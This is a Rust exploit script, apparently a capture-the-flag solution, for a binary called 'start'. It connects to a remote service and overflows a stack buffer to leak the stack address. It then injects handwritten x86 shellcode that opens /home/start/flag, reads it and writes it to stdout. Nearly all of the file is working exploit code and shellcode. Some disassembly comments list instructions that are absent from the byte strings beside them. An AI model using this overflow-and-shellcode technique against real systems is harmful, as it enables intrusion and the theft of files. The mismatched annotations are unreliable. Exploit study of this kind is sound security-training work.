use std::net::TcpStream;
use std::io::Read;
use std::io::Write;
use std::error::Error;
use std::fs::File;
use std::env;

static LOCAL: bool = false;

// target information 
/* 
 * read buffer overflow, sp + 0x14; ret; 
 * stack is executable
 * leak stack address by returning and moving esp into ecx
 * null bytes accepted (read syscall)
 * shellcode: open file, read file, write to stdout
 */

fn parse_args(args: Vec<String>) -> String {
    if args.len() < 3 {
        panic!("Error: usage <binary> <address> <port>");
    }
    let mut addr: String = args[1].to_string().clone();
    addr.push_str(":");
    addr.push_str(&args[2]);
    return addr;
}

fn create_socket(addr: String) -> Result<TcpStream, std::io::Error> {
    let stream = TcpStream::connect(addr);
    return stream;
}

fn try_read(s: &mut TcpStream) -> (usize, [u8; 1024]) {
    let mut recvbuf = [0; 1024];
    let n = s.read(&mut recvbuf);
    match n {
        Ok(n) => return (n, recvbuf),
        Err(e) => panic!("Problem reading from server {:?}", e),
    };
}

fn try_write(s: &mut TcpStream, buf: &[u8]) -> Result<usize, std::io::Error> {
    let n = s.write(buf);
    return n;
}

fn main() -> Result<(), Box<dyn Error>> {
    let mut recvbuf: [u8; 1024];
    let mut n: usize;

    // payload 1: leak esp by moving esp into ecx and printing to console 
    let mut payload = vec![0x41; 0x14]; 
    let leak_addr: u32 = 0x08048087;
    payload.extend_from_slice(&leak_addr.to_le_bytes());

    assert!(payload.len() <= 0x3c);

    // syscalls 
    const OPEN_SYSCALL: &[u8] = b"\x89\xCB\x31\xC9\xB1\x80\xB0\x05\xCD\x80";
    /*
    0:  89 cb                   mov    ebx,ecx
    2:  31 c9                   xor    ecx,ecx
    4:  b1 80                   mov    cl,0x80
    6:  31 d2                   xor    edx,edx
    8:  b0 05                   mov    al,0x5
    a:  cd 80                   int    0x80 
    */

    const READ_SYSCALL: &[u8] = b"\x89\xD9\x31\xDB\x88\xC3\xB2\x20\xB0\x03\xCD\x80";
    /*
    0:  89 d9                   mov    ecx,ebx
    2:  31 db                   xor    ebx,ebx
    4:  88 c3                   mov    bl,al
    6:  31 d2                   xor    edx,edx
    8:  b2 20                   mov    dl,0x20
    a:  b0 03                   mov    al,0x3
    c:  cd 80                   int    0x80 
    */

    const WRITE_SYSCALL: &[u8] = b"\x88\xC2\xB3\x01\xB0\x04\xCD\x80";
    /*
    0:  88 c2                   mov    dl,al
    2:  b3 01                   mov    bl,0x1
    4:  b0 04                   mov    al,0x4
    6:  cd 80                   int    0x80 
    */

    const EXIT_SYSCALL: &[u8] = b"\xB0\x01\xCD\x80";
    /* 
    0:  b0 01                   mov    al,0x1
    2:  cd 80                   int    0x80     
    */

    if LOCAL {
        let mut file = File::create("start_input")?;
        file.write_all(&payload)?;
        Ok(())
    }
    else {
        // create read and write fds, sleep
        let args: Vec<String> = env::args().collect();
        let addr: String = parse_args(args);
        println!("Connecting to {}", addr);

        // let mut r = TcpStream::connect(addr)?;
        let mut r = create_socket(addr)?;
        let mut w = r.try_clone()?;
        std::thread::sleep(std::time::Duration::from_secs(3));

        // read initial prompt
        (n, recvbuf) = try_read(&mut r);
        eprintln!("received {} bytes: {}", n, String::from_utf8_lossy(&recvbuf[..n]));

        // write first payload 
        n = try_write(&mut w, &payload)?;
        eprintln!("sent {} bytes", n);

        // receive response, including $esp
        // try reading response
        (n, recvbuf) = try_read(&mut r);
        let mut stack_addr_ptr: [u8; 4] = Default::default();
        stack_addr_ptr.copy_from_slice(&recvbuf[0..4]);
        let stack_addr = u32::from_le_bytes(stack_addr_ptr);
        eprintln!("received {} bytes: {:#02x}", n, stack_addr);

        // write shellcode
        const FILENAME: &[u8; 17] = b"/home/start/flag\x00";
        let pad = vec![0x41; 0x14 - FILENAME.len()];
        let mut shellcode: Vec<u8> = Vec::new();
        shellcode.extend_from_slice(FILENAME);
        shellcode.extend_from_slice(&pad);
        shellcode.extend_from_slice(&(stack_addr + 0x14).to_le_bytes());
        shellcode.extend_from_slice(OPEN_SYSCALL);
        shellcode.extend_from_slice(READ_SYSCALL);
        shellcode.extend_from_slice(WRITE_SYSCALL);
        shellcode.extend_from_slice(EXIT_SYSCALL);

        assert!(shellcode.len() <= 0x3c);
        
        n = try_write(&mut w, &shellcode)?;
        eprintln!("sent {} bytes", n);
        
        // try reading response
        (n, recvbuf) = try_read(&mut r);
        eprintln!("received {} bytes: {}", n, String::from_utf8_lossy(&recvbuf[..n]));
        
        Ok(())
    }
}